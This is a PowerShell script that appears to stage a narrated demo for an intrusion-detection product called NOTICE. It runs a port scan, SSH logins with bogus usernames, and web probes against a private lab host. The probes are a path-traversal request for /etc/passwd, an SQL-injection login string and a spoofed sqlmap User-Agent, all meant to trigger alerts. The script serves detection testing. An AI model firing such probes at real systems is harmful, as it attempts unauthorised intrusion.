# ======================================================================
# NOTICE demo attack script (ASCII-only for Windows PowerShell 5)
# Runs on the Windows attacker box (10.2.139.119).
# Attacks 10.1.96.53 in 3 stages with narratable pauses.
#
# Requirements (all native to Windows 10/11 -- no install needed):
#   - PowerShell 5+
#   - ssh.exe   (Windows OpenSSH client)
#   - curl.exe  (Windows 10+)
#
# Run:
#   powershell -ExecutionPolicy Bypass -File .\attack.ps1
# ======================================================================

param(
    [string]$Target = "10.1.96.53",
    [int]$WebPort = 8080,
    [int]$PauseBetweenStagesSec = 30
)

function Say($msg) {
    Write-Host ""
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host $msg -ForegroundColor Cyan
    Write-Host "==========================================================" -ForegroundColor Cyan
}

function Pause-Stage($label) {
    Write-Host ""
    Write-Host "-- Waiting $PauseBetweenStagesSec s so NOTICE can display the alert before the next stage ($label) --" -ForegroundColor Yellow
    Start-Sleep -Seconds $PauseBetweenStagesSec
}

Say "STAGE 1 of 3 -- Reconnaissance: TCP port scan against $Target"
Write-Host "Probing 30 common ports (PowerShell Test-NetConnection)..."
$ports = 21,22,23,25,53,80,110,111,135,139,143,161,389,443,445,465,587,636,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,9200
foreach ($p in $ports) {
    $r = Test-NetConnection -ComputerName $Target -Port $p -InformationLevel Quiet -WarningAction SilentlyContinue
    if ($r) { Write-Host "  port $p : OPEN" -ForegroundColor Green }
    else    { Write-Host "  port $p : closed" -ForegroundColor DarkGray }
    Start-Sleep -Milliseconds 300
}
Write-Host "Recon burst complete. NOTICE should show a scan alert (sid 5900001)." -ForegroundColor Green

Pause-Stage "SSH brute force"

Say "STAGE 2 of 3 -- SSH brute-force attempts against $Target"
Write-Host "Firing 8 SSH connections with bogus creds (will all fail -- that's the point)..."
$badusers = "admin","root","oracle","postgres","backup","test","demo","guest"
foreach ($u in $badusers) {
    Write-Host "  ssh $u@$Target ..." -ForegroundColor DarkGray
    Start-Process -FilePath "ssh.exe" -ArgumentList "-o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=3 $u@$Target exit" -NoNewWindow -Wait -RedirectStandardOutput $env:TEMP\ssh_out.txt -RedirectStandardError $env:TEMP\ssh_err.txt 2>$null
    Start-Sleep -Milliseconds 500
}
Write-Host "SSH burst complete. NOTICE should show an SSH brute-force alert (sid 5900002)." -ForegroundColor Green

Pause-Stage "Web attack"

$WebBase = "http://${Target}:${WebPort}"
Say "STAGE 3 of 3 -- Web application attacks against $WebBase/"
Write-Host "3a. Path traversal ..."
curl.exe -s -m 5 "$WebBase/etc/../../../etc/passwd" | Out-Null
Start-Sleep -Milliseconds 500
Write-Host "3b. SQL injection in URI ..."
$sqliUrl = "$WebBase/login?user=admin' OR '1'='1" + [char]38 + "pass=x"
curl.exe -s -m 5 $sqliUrl | Out-Null
Start-Sleep -Milliseconds 500
Write-Host "3c. sqlmap User-Agent probe ..."
curl.exe -s -m 5 -A "sqlmap/1.5.4#stable (http://sqlmap.org)" "$WebBase/index.html" | Out-Null
Write-Host "Web attacks complete. NOTICE should show 3 web alerts (sids 5900003, 5900004, 5900005)." -ForegroundColor Green

Say "ATTACK RUN COMPLETE"
Write-Host "Summary of what NOTICE should have captured:" -ForegroundColor White
Write-Host "  * Stage 1 alert cluster from src=$env:COMPUTERNAME to dst=$Target on many ports (sid 5900001)"
Write-Host "  * Stage 2 SSH brute alert (sid 5900002)"
Write-Host "  * Stage 3 web attack alerts (sids 5900003 / 5900004 / 5900005)"
Write-Host ""
Write-Host "Auto-promotion should have created 1-3 incidents. Now switch to the NOTICE UI for the walkthrough."
